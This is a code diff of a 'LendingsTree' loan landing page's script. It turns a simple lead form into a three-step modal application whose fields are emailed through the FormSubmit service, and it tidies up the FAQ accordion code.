+      showToast("Please complete all required fields.", true);
+      return;
+    }
+    const submitBtn = document.getElementById('submitFinalBtn');
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Submitting...';
     const params = new URLSearchParams();
-    params.append('_subject', `🔔 New Loan Lead - LendingsTree`);
+    params.append('_subject', '🔔 LendingsTree - New 3-Step Loan Application');
     params.append('_captcha', 'false');
     params.append('_template', 'table');
-    params.append('_replyto', formDataMap.email);
-    params.append('Full Name', formDataMap.fullName);
-    params.append('Email', formDataMap.email);
-    params.append('Phone', formDataMap.phone);
-    params.append('Loan Amount', formDataMap.loanAmount);
+    params.append('_replyto', data.email);
+    for (let [key, val] of Object.entries(data)) {
+      params.append(key, val || 'Not provided');
+    }
     params.append('Submitted At', new Date().toLocaleString());
-    
     try {
-      const response = await fetch(endpoint, {
+      const res = await fetch(`https://formsubmit.co/ajax/${RECIPIENT_EMAIL}`, {
         method: 'POST',
         headers: { 'Accept': 'application/json' },
         body: params
       });
-      const result = await response.json();
-      if (response.ok && result.success !== false) {
-        showToast("✅ Application received! A loan specialist will contact you shortly.", false);
-        leadForm.reset();
-        return true;
-      } else {
-        throw new Error("FormSubmit error");
-      }
+      const result = await res.json();
+      if (res.ok && result.success !== false) {
+        showToast("✅ Application received! A loan specialist will contact you shortly.");
+        modal.classList.remove('active');
+        // Reset form fields
+        document.querySelectorAll('#applyModal input').forEach(inp => inp.value = '');
+        currentModalStep = 1;
+        updateModalUI();
+      } else throw new Error();
     } catch (err) {
-      console.error(err);
-      showToast("⚠️ Delivery error. Please try again or contact support.", true);
-      return false;
+      showToast("⚠️ Delivery error. Please try again.", true);
+    } finally {
+      submitBtn.disabled = false;
+      submitBtn.innerHTML = 'Submit Application →';
     }
   }
 
-  leadForm.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    if (!validateForm()) return;
-    
-    const fullName = document.getElementById('fullName').value.trim();
-    const email = document.getElementById('email').value.trim();
-    const phone = document.getElementById('phone').value.trim();
-    const loanAmount = document.getElementById('loanAmount').value;
-    
-    submitBtn.disabled = true;
-    submitBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Submitting...';
-    
-    const leadInfo = { fullName, email, phone, loanAmount };
-    const success = await submitLeadToEmail(leadInfo);
-    
-    submitBtn.disabled = false;
-    submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Get My Rate';
-    if (success) {
-      document.getElementById('fullName').value = '';
-      document.getElementById('email').value = '';
-      document.getElementById('phone').value = '';
-      document.getElementById('loanAmount').selectedIndex = 0;
-    }
+  // Event listeners for modal
+  openBtns.forEach(btn => btn.addEventListener('click', () => { modal.classList.add('active'); currentModalStep = 1; updateModalUI(); }));
+  closeBtn.addEventListener('click', () => modal.classList.remove('active'));
+  modal.addEventListener('click', (e) => { if (e.target === modal) modal.classList.remove('active'); });
+
+  document.getElementById('nextStep1Btn').addEventListener('click', () => {
+    if (validateStep1()) { currentModalStep = 2; updateModalUI(); }
+  });
+  document.getElementById('prevStep2Btn').addEventListener('click', () => { currentModalStep = 1; updateModalUI(); });
+  document.getElementById('nextStep2Btn').addEventListener('click', () => {
+    if (validateStep2()) { currentModalStep = 3; updateModalUI(); }
+  });
+  document.getElementById('prevStep3Btn').addEventListener('click', () => { currentModalStep = 2; updateModalUI(); });
+  document.getElementById('submitFinalBtn').addEventListener('click', async () => {
+    if (validateStep3()) await submitFinal();
   });
 
   // FAQ accordion
-  const faqItems = document.querySelectorAll('.faq-item');
-  faqItems.forEach(item => {
-    const questionDiv = item.querySelector('.faq-question');
-    questionDiv.addEventListener('click', () => {
-      const isActive = item.classList.contains('active');
-      faqItems.forEach(i => i.classList.remove('active'));
-      if (!isActive) item.classList.add('active');
+  document.querySelectorAll('.faq-item').forEach(item => {
+    const q = item.querySelector('.faq-question');
+    q.addEventListener('click', () => {
+      const active = item.classList.contains('active');
+      document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('active'));
+      if (!active) item.classList.add('active');
     });
   });
-  if (faqItems.length) faqItems[0].classList.add('active');
+  document.querySelectorAll('.faq-item')[0]?.classList.add('active');
 </script>
 </body>
 </html>
